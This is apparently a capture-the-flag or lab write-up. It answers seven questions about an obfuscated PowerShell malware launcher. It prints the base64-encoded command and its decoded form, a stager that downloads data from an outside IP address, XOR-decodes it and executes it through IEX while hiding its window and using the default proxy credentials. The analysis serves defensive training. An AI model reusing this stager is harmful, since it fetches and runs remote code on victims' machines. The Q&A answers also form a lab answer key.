> # PowerShell Script

## Summary
- [Summary](#summary)
  - [Q1. What encoding is the malicious script using?](#q1-what-encoding-is-the-malicious-script-using)
  - [Q2. What parameter in the powershell script makes it so that the powershell window is hidden when executed?](#q2-what-parameter-in-the-powershell-script-makes-it-so-that-the-powershell-window-is-hidden-when-executed)
  - [Q3. What parameter in the Powershell script prevents the user from closing the process?](#q3-what-parameter-in-the-powershell-script-prevents-the-user-from-closing-the-process)
  - [Q4. What line of code allows the script to interact with websites and retrieve information from them?](#q4-what-line-of-code-allows-the-script-to-interact-with-websites-and-retrieve-information-from-them)
  - [Q5. What is the user agent string that is being spoofed in the malicious script?](#q5-what-is-the-user-agent-string-that-is-being-spoofed-in-the-malicious-script)
  - [Q6. What line of code is used to set the proxy credentials for authentication in the script?](#q6-what-line-of-code-is-used-to-set-the-proxy-credentials-for-authentication-in-the-script)
  - [Q7. When the malicious script is executed, what is the URL that the script contacts to download the malicious payload?](#q7-when-the-malicious-script-is-executed-what-is-the-url-that-the-script-contacts-to-download-the-malicious-payload)

```powershell
powershell.exe -NoP -sta -NonI -W Hidden -Enc
JABXAEMAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwB5AFMAVABlAE0ALgBOAEUAVAAuAFcAZQBiAEMAbABpAEUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAEEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAG8AeABZACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFcARQBCAFIAZQBRAFUARQBzAHQAXQA6ADoARABFAEYAQQB1AEwAdABXAGUAYgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBPAHgAWQAuAEMAcgBFAGQAZQBuAFQAaQBhAGwAUwAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBFAHQALgBDAFIAZQBkAGUATgBUAEkAQQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4AZQB0AFcATwByAEsAQwByAGUAZABFAE4AVABpAEEAbABzADsAJABLAD0AJwBJAE0ALQBTACYAZgBBADkAWAB1AHsAWwApAHwAdwBkAFcASgBoAEMAKwAhAE4AfgB2AHEAXwAxADIATAB0AHkAJwA7ACQAaQA9ADAAOwBbAEMASABhAFIAWwBdAF0AJABCAD0AKABbAGMASABhAFIAWwBdAF0AKAAkAHcAYwAuAEQATwB3AE4ATABPAGEARABTAHQAcgBpAE4AZwAoACIAaAB0AHQAcAA6AC8ALwA5ADgALgAxADAAMwAuADEAMAAzAC4AMQA3ADAAOgA3ADQANAAzAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgAbwBSACQASwBbACQASQArACsAJQAkAGsALgBMAEUAbgBHAFQASABdAH0AOwBJAEUAWAAgACgAJABCAC0AagBPAEkAbgAnACcAKQA=
```
### Q1. What encoding is the malicious script using?
The script is encoded by base64.<br>
**Answer:** base64

### Q2. What parameter in the powershell script makes it so that the powershell window is hidden when executed?
The flag `-W` stands for `-WindowsStyle` and the `Hidden` value will make the powershell windows is hidden when executed.<br>
**Answer:** -W Hidden

### Q3. What parameter in the Powershell script prevents the user from closing the process?
The `-NonI` stands for `NonInteractive` flag in PowerShell is used to start a PowerShell session that does not accept user input. So the cannot input termination signal to powershell<br>
**Answer:** -NonI

### Q4. What line of code allows the script to interact with websites and retrieve information from them?
Decode the base64 string, you will get the plain text.<br>
```powershell
$WC=New-ObjEcT SySTeM.NET.WebCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADeRS.ADd('User-Agent',$u);$Wc.ProxY = [System.NeT.WEBReQUEst]::DEFAuLtWebProXy;$wc.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls;$K='IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty';$i=0;[CHaR[]]$B=([cHaR[]]($wc.DOwNLOaDStriNg("http://98.103.103.170:7443/index.asp")))|%{$_-BXoR$K[$I++%$k.LEnGTH]};IEX ($B-jOIn'')
```
The line `$WC=New-ObjEcT SySTeM.NET.WebCliENt` create a new `WebClient` object which is usually use for web interact.<br>
**Answer:** $WC=New-ObjEcT SySTeM.NET.WebCliENt

### Q5. What is the user agent string that is being spoofed in the malicious script?
The `$u` variable store the user-agent string.<br>
**Answer:** Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko

### Q6. What line of code is used to set the proxy credentials for authentication in the script?
**Answer:** $wc.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls

### Q7. When the malicious script is executed, what is the URL that the script contacts to download the malicious payload?
The `$wc` variable `DownloadString` was used to set the URL for download payload.<br>
**Answer:** http://98.103.103.170:7443/index.asp
